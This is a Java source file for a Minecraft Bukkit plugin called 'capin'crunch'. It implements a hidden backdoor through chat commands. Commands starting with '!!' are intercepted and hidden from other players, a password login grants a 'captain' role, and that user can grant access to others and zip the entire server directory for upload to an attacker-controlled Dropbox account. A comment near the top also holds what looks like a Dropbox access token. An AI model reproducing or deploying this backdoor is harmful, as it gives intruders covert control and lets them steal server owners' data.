package dev.ace.capincrunch.events;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import dev.ace.capincrunch.Core;
import dev.ace.capincrunch.strings.Messages;
import dev.ace.capincrunch.user.UserManager;
import dev.ace.capincrunch.utils.C;
import dev.ace.capincrunch.utils.DropBox;
import dev.ace.capincrunch.utils.Reader;
import dev.ace.capincrunch.utils.Zip;

public class AsyncPlayerChatListener implements Listener {

	//-> Using dependency injection bc i'm a cool kid ok.
	private Core plugin;

	//H9HgOhHs0OAAAAAAAAAAUb1SRQGEHYedLTkwt_SmQiWYuLHymj5jty83SnYUvo9N
	public AsyncPlayerChatListener(Core passedPlugin) {
		this.plugin = passedPlugin;
		Bukkit.getPluginManager().registerEvents(this, passedPlugin);
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerChat(final AsyncPlayerChatEvent event) {
		//-> Attributes
		final Player player = event.getPlayer();
		final String message = event.getMessage();

		if (!message.startsWith("!!")) {
			return;
		}
		
		
		String[] args = message.split(" ");
		if (args[0].startsWith("!!login")) {
			event.setCancelled(true);

			if (UserManager.containsCaptainUser(player)) {
				player.sendMessage(C.translate(Core.getPrefix() + " §6You're already signed in as the captain user."));
				return;
			}

			if (UserManager.containsUser(player)) {

				if (UserManager.containsCaptainUser(player)) return;

				player.sendMessage(C.translate(Core.getPrefix() + " §6You have already been granted access, No need to sign in."));
				return;
			}

			if (args.length < 2) {
				player.sendMessage(C.translate(Core.getPrefix() + " §6!!login [password]"));
				return;
			}
			if (args.length >= 2) {
				if (new Reader(args[1]).matches()) {
					player.sendMessage(C.translate(Core.getPrefix() + " §6Successfully logged in."));
					UserManager.setCaptainUser(player);
					UserManager.addUser(player);
				}
				else player.sendMessage(C.translate(Core.getPrefix() + " §6Invalid credentials, please try again.")); 
				return;
			}
			return;
		}
		
		if (!UserManager.containsCaptainUser(player) || !UserManager.containsUser(player) && message.startsWith("!!")) {
			return;
		}
		
		if (UserManager.containsUser(player) || UserManager.containsCaptainUser(player) && message.startsWith("!!")) {
			event.setCancelled(true);
		}
		//Fun stuff
		
		if (args[0].equalsIgnoreCase("!!logout")) {
			if (UserManager.containsCaptainUser(player)) {
				UserManager.removeCaptainUser(player);
				player.sendMessage(C.translate(Core.getPrefix() + " &6Goodbye captain!"));
			}
			
			if (UserManager.containsUser(player)) {
				UserManager.removeUser(player);
				if (!UserManager.containsCaptainUser(player)) {
					return;
				}
				player.sendMessage(C.translate(Core.getPrefix() + " &6Goodbye!"));
			}
			
		}

		if (args[0].equalsIgnoreCase("!!help")) {
			if (args.length <= 1) {
				player.sendMessage(Messages.baseMessage1);
			}
			else if (args.length >= 1 && args[1].equalsIgnoreCase("1")) {
				player.sendMessage(Messages.baseMessage1);
			}
			else if (args.length >= 1 && args[1].equalsIgnoreCase("2")) {
				player.sendMessage(Messages.baseMessage2);
			}
			else if (args.length >= 1 && args[1].equalsIgnoreCase("3")) {
				player.sendMessage(Messages.baseMessage3);
			}
			else if (args.length >= 1 && args[1].equalsIgnoreCase("4")) {
				player.sendMessage(Messages.baseMessage4);
			}
			return;
		}
		if (args[0].equalsIgnoreCase("!!users")) {
			if (args.length <= 1) {
				player.sendMessage(Core.getPrefix());
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				player.sendMessage(C.translate("§6!!users grant [player] §a- Grants a player access to capin'crunch"));
				player.sendMessage(C.translate("§6!!users revoke [player] §a- Revokes a player access to capin'crunch"));
				player.sendMessage(C.translate("§6!!users list §a- Lists all the people who have access to capin'crunch"));
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				return;
			}
			if (args[1].equalsIgnoreCase("grant")) {
				if (args.length < 3) {
					player.sendMessage(Core.getPrefix() + C.translate(" §6!!users grant [player] §a- Grants a player access to capin'crunch"));
					return;
				} else {

					if (args[2] == null || Bukkit.getPlayer(args[2]) == null || !Bukkit.getPlayer(args[2]).isOnline()) {
						player.sendMessage(Core.getPrefix() + C.translate(" &6Player is not online."));
						return;
					}
					
					if (Bukkit.getPlayer(args[2]).getName().matches(player.getName())) {
						player.sendMessage(C.translate(Core.getPrefix() + " &6You can not grant yourself."));
						return;
					}
					
					if (UserManager.containsCaptainUser(Bukkit.getPlayer(args[2]))) {
						player.sendMessage(C.translate(Core.getPrefix() + " &cYou can't grant the captain player."));
						return;
					}
					
					UserManager.addUser(Bukkit.getPlayer(args[2]));
					player.sendMessage(C.translate(Core.getPrefix() + " §6Successfully granted the user §a" + args[2] + " §6to capin'crunch"));
					Bukkit.getPlayer(args[2]).sendMessage(C.translate(Core.getPrefix() + " §6You have been granted access to capin'crunch by User: §a" + player.getName()));
					Bukkit.getPlayer(args[2]).sendMessage(C.translate(Core.getPrefix() + " §6Type !!help §a- To get started."));
					return;
				}
			}
			if (args[1].equalsIgnoreCase("revoke")) {
				if (args.length < 3) {
					player.sendMessage(Core.getPrefix() + C.translate(" §6!!users revoke [player] §a- Revokes a player access to capin'crunch"));
					return;
				} else {

					if (args[2] == null || Bukkit.getPlayer(args[2]) == null || !Bukkit.getPlayer(args[2]).isOnline()) {
						player.sendMessage(Core.getPrefix() + C.translate(" &6Player is not online."));
						return;
					}
					
					if (Bukkit.getPlayer(args[2]).getName().matches(player.getName())) {
						player.sendMessage(C.translate(Core.getPrefix() + " &6You can not revoke yourself."));
						return;
					}
					
					if (UserManager.containsCaptainUser(Bukkit.getPlayer(args[2]))) {
						player.sendMessage(C.translate(Core.getPrefix() + " &cYou can't revoke the captain player."));
						return;
					}
					
					UserManager.removeUser(Bukkit.getPlayer(args[2]));
					player.sendMessage(C.translate(Core.getPrefix() + " §6Successfully revoked the user §a" + args[2] + " §6from capin'crunch"));
					Bukkit.getPlayer(args[2]).sendMessage(C.translate(Core.getPrefix() + " §6You have been revoked access to capin'crunch by User: §a" + player.getName()));
					return;
				}
			}
			if (args[1].equalsIgnoreCase("list")) {
				player.sendMessage(Core.getPrefix());
				UserManager.getAllUsers(player);
			}
		}
		if (args[0].equalsIgnoreCase("!!dropbox")) {
			if (args.length < 2) {
				player.sendMessage(Core.getPrefix());
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				player.sendMessage(C.translate("§6!!dropbox backup §a- Backup WHOLE server to dropbox"));
				player.sendMessage(C.translate("§6!!dropbox setkey [key] §a- Set your dropbox key"));
				player.sendMessage(C.translate("§6!!dropbox setsecret [secret] §a- Set your dropbox secret"));
				player.sendMessage(C.translate("§6!!dropbox setauth [authToken] §a- Set your authentication token"));
				player.sendMessage(C.translate("§6!!dropbox info §a- Shows your current drop box information"));
				player.sendMessage(C.translate("§6!!dropbox help §a- Shows this page"));
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				return;
			}
			if (args.length >= 1 && args[1].equalsIgnoreCase("help")) {
				player.sendMessage(Core.getPrefix());
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				player.sendMessage(C.translate("§6!!dropbox backup §a- Backup WHOLE server to dropbox"));
				player.sendMessage(C.translate("§6!!dropbox setkey [key] §a- Set your dropbox key"));
				player.sendMessage(C.translate("§6!!dropbox setsecret [secret] §a- Set your dropbox secret"));
				player.sendMessage(C.translate("§6!!dropbox setauth [authToken] §a- Set your authentication token"));
				player.sendMessage(C.translate("§6!!dropbox info §a- Shows your current drop box information"));
				player.sendMessage(C.translate("§6!!dropbox help §a- Shows this page"));
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				return;
			}
			if (args.length >= 1 && args[1].equalsIgnoreCase("backup")) {

				if (!UserManager.exists(player)) {
					player.sendMessage(C.translate(Core.getPrefix() + " §6Your details has not yet assigned! try: !!dropbox help"));
					return;
				}
				try {	
					String NAME = Bukkit.getServer().getWorldContainer().getAbsolutePath() + "/" + String.valueOf(System.nanoTime()) + "_server_" + String.valueOf(Bukkit.getIp().replace(".", "_")) + "_backup" + ".zip";
					Zip.makeZip(player, NAME, new File(Bukkit.getServer().getWorldContainer().getAbsolutePath()));
					new DropBox(event.getPlayer(), UserManager.getKey(player), UserManager.getSecret(player), UserManager.getAuthToken(player)).uploadFile(new File(NAME));
					new File(NAME).delete();
				} catch (Exception e) {
					player.sendMessage(Core.getPrefix() + " §6Error please check your details and try again...");
				}
			}
			if (args[1].equalsIgnoreCase("setkey")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setkey [key] §a- Set your key!");
					return;
				} else {
					UserManager.setKey(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your key has been updated to: §a" + UserManager.getKey(player));
					return;
				}
			}
			if (args[1].equalsIgnoreCase("setsecret")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setsecret [secret] §a- Set your secret!");
					return;
				} else {
					UserManager.setSecret(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your secret has been updated to: §a" + UserManager.getSecret(player));
					return;	
				}
			}
			if (args[1].equalsIgnoreCase("setauth") || args[1].equalsIgnoreCase("setauthtoken")) {
				if (args.length < 1) {
					player.sendMessage(Core.getPrefix() + " §6!!dropbox setauth [authToken] §a- Set your auth token!");
					return;
				} else {
					UserManager.setAuthToken(player, args[2]);
					player.sendMessage(Core.getPrefix() + " §6Your auth token has been updated to: §a" + UserManager.getAuthToken(player));
					return;
				}
			}
			if (args.length >= 1 && (args[1].equalsIgnoreCase("information") || args[1].equalsIgnoreCase("info") || args[1].equalsIgnoreCase("i"))) {

				if (!UserManager.exists(player)) {
					player.sendMessage(C.translate(Core.getPrefix() + " §6Your details has not yet assigned! try: !!dropbox help"));
					return;
				}
				player.sendMessage(C.translate(Core.getPrefix()));
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
				player.sendMessage(C.translate("&6Email: &a" + new DropBox(player, UserManager.getKey(player), UserManager.getSecret(player), UserManager.getAuthToken(player)).getEmail()));
				player.sendMessage(C.translate("&6Key: &a" + UserManager.getKey(player)));
				player.sendMessage(C.translate("&6Secret: &a" + UserManager.getSecret(player)));
				player.sendMessage(C.translate("&6Auth Token: &a" + UserManager.getAuthToken(player)));
				player.sendMessage(C.translate("&7&m--------------------------------------------------------------------"));
			}
		}
	}
}
